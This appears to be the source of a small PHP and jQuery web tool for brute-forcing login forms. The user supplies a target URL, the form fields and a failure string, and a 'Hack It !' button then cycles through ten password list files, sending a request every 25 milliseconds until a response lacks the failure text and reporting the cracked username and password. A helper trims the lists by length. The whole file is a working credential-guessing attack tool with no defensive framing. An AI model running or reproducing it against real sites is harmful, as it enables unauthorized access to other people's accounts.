<?php
error_reporting(E_ALL);
ini_set('memory_limit', '1024M');
if(!file_exists("passwords1.txt")){for($k=1;$k<=10;$k++){file_put_contents("passwords".$k.".txt","");}}
$i=1;
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link rel="stylesheet" type="text/css" media="all" href="resources/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" media="all" href="resources/css/ie10-viewport-bug-workaround.css">
	<script type="text/javascript" src="resources/js/jquery-1.6.3.min.js"></script>
	<!--[if lt IE 9]><script src="resources/js/ie8-responsive-file-warning.js"></script><![endif]-->
	<script src="resources/js/ie-emulation-modes-warning.js"></script>
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
	<style>
	input[type="text"]
	{
		font-size:20px;
	}
	</style>
</head>
<body>
<div class="container">
	<div class="row">
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4"></div>
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4">
			<div id="response">
			</div>
			<div id="response-count">
			</div>
		</div>
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4"></div>
	</div>
	<div class="row">
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4"></div>
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4">
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
					<label for="inputUrl">Url</label>
					<input type="text" id="inputUrl" value="localhost/matrimony/home.php" name="inputUrl" class="form-control" placeholder="example.com" required autofocus>
					<div class="form-error">
						<span id="inputUrl-alert"></span>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
				<label for="inputMethod">Method</label>
					<input type="text" id="inputMethod" value="POST" name="inputMethod" class="form-control" placeholder="Method GET/POST" required>
					<div class="form-error">
						<span id="inputMethod-alert"></span>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
				<label for="inputVariable">Variables</label>
					<input type="text" id="inputVariable" value='"inputUsername":"raza","inputPassword":"*pass*"' name="inputVariable" class="form-control" placeholder='"username":"input","password":"*input*","submit":"input"' required>
					<div class="form-error">
						<span id="inputVariable-alert"></span>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
				<label for="inputErrorText">Error Text</label>
					<input type="text" id="inputErrorText" value="Invalid" name="inputErrorText" class="form-control" placeholder="invalid or success" required>
					<div class="form-error">
						<span id="inputErrorText-alert"></span>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
				<input type="hidden" name="hacked" id="hacked" value=""/>
				<button class="btn btn-success btn-block" id="hackIt" type="submit">Hack It !</button>
				</div>
			</div>
		</div>
	</div>
	<div class="row">
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4"></div>
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4">
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
					<label for="inputMin">Password Min Length</label>
					<input type="text" id="inputMin" value="" name="inputMin" class="form-control" placeholder="Minimum Characters" required autofocus>
					<div class="form-error">
						<span id="inputMin-alert"></span>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
				<label for="inputMax">Password Max Length</label>
					<input type="text" id="inputMax" value="" name="inputMax" class="form-control" placeholder="Maximum Characters" required>
					<div class="form-error">
						<span id="inputMax-alert"></span>
					</div>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
					<input type="hidden" name="spfFlag" id="spfFlag" value=""/>
					<button class="btn btn-success btn-block" id="spf" type="submit">Sanitize Password File !</button>
				</div>
			</div>
		</div>
		<div class="col-xs-12 col-sm-4 col-md-4 col-lg-4"></div>
	</div>
</div>
<script>
var passwords="";
var num_current=0;
var i = 1;
var cnt=1;
$("#hackIt").click(function() {
var fields=['inputUrl','inputMethod','inputVariable','inputErrorText'];
var checkFields=0;
for(var i=0;i<fields.length;i++) {
if($("#"+fields[i]).val() == "") {
checkFields=checkFields-1;
}
else {
checkFields=checkFields+1;
}
}
 if(checkFields == fields.length) {
 passwords = getJson("passwords1.txt");
 var pwdlength=passwords.length;
 myLoop(passwords,pwdlength);
 }
 }
);

$("#spf").click(function() {
$("#response").html("Please Wait ,Password List Sync In Process!");
sanitizeRequest("POST",$("#inputMin").val(),$("#inputMax").val());
}
);
function getJson(file) {return JSON.parse($.ajax({url: "getfile.php?file="+file,dataType: 'json',global: false,async:false,success: function(data) {return data;}}).responseText);}
function myLoop (passwords,pwdlength) {
 setTimeout(function () {
makeRequest(i,passwords[i],$("#inputErrorText").val(),$("#inputVariable").val().replace("*pass*",passwords[i]),$("#inputMethod").val(),$("#inputUrl").val(),cnt);
 i++;
 if (i < pwdlength) {
 myLoop(passwords,pwdlength);
 }
else{
 if(i == pwdlength && cnt <= 10) {
 i=1;
cnt=cnt+1;
passwords="";
pwdlength=0;
 if(cnt == 2) {
 passwords = getJson('passwords2.txt');
 }
 else if(cnt == 3) {
 passwords = getJson('passwords3.txt');
 }
 else if(cnt == 4) {
 passwords = getJson('passwords4.txt');
 }
 else if(cnt == 5) {
 passwords = getJson('passwords5.txt');
 }
 else if(cnt == 6) {
 passwords = getJson('passwords6.txt');
 }
 else if(cnt == 7) {
 passwords = getJson('passwords7.txt');
 }
 else if(cnt == 8) {
 passwords = getJson('passwords8.txt');
 }
 else if(cnt == 9) {
 passwords = getJson('passwords9.txt');
 }
 else {
 passwords = getJson('passwords10.txt');
 }
pwdlength=passwords.length;
myLoop(passwords,pwdlength);
}
 }
 }
, 25) }

function makeRequest(i,pass,error,inputvar,method,url,cnt) {
$.ajax({
 type: method, url: "http://"+url, data: JSON.parse("{"+inputvar+"}"), dataType: "text", success: function(resultData) {
 if($("#hacked").val() != "hacked"){
$("#response-count").html(i+" Attempts made from file passwords"+parseInt(cnt)+".txt");
}
 if(resultData.indexOf(error) == -1 ){
if($("#hacked").val() != "hacked"){
 $("#response").html("Password found (User:"+inputvar.substr(inputvar.indexOf(':')+2, inputvar.indexOf(',')-2)+" ,Pass:"+pass);
}
 $("#hacked").val("hacked");
}
}
 ,error: function() {
$("#response").html("Something went wrong");
}
});
}

function sanitizeRequest(method,min,max) {
 $.ajax({
type: method, url: "http://localhost/formAttack/ajax/sanitizePassword.php", data: {"min":min,"max":max}, dataType: "text", success: function(resultData) {
 if(parseInt(resultData) == 1) {
$("#response").html("Password List Sync Success!");
}
}
,error: function() {
$("#response").html("Something went wrong");
}
});}

</script>
</body>
</html>
